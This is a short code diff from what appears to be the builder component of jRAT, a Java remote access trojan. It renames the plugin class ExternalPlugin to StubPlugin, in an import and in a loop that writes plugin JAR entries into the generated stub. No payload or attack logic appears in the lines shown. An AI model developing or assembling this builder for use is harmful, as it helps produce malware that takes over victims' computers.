@@ -26,8 +26,8 @@ import pro.jrat.common.crypto.EncryptionKey;
 import pro.jrat.common.hash.Md5;
 import pro.jrat.common.hash.Sha1;
 import pro.jrat.crypto.FileCrypter;
-import pro.jrat.extensions.ExternalPlugin;
 import pro.jrat.extensions.PluginList;
+import pro.jrat.extensions.StubPlugin;
 import pro.jrat.io.Files;
 import pro.jrat.listeners.BuildListener;
 import pro.jrat.ui.frames.FrameSummary;
@@ -168,7 +168,7 @@ public class Build {
 				listener.reportProgress(50, "Writing plugins...", BuildStatus.INFO);
 
 				for (int i = 0; i < pluginlist.plugins.size(); i++) {
-					ExternalPlugin p = pluginlist.plugins.get(i);
+					StubPlugin p = pluginlist.plugins.get(i);
 					JarFile plugin = new JarFile(p.path);
 					entries = plugin.entries();
 
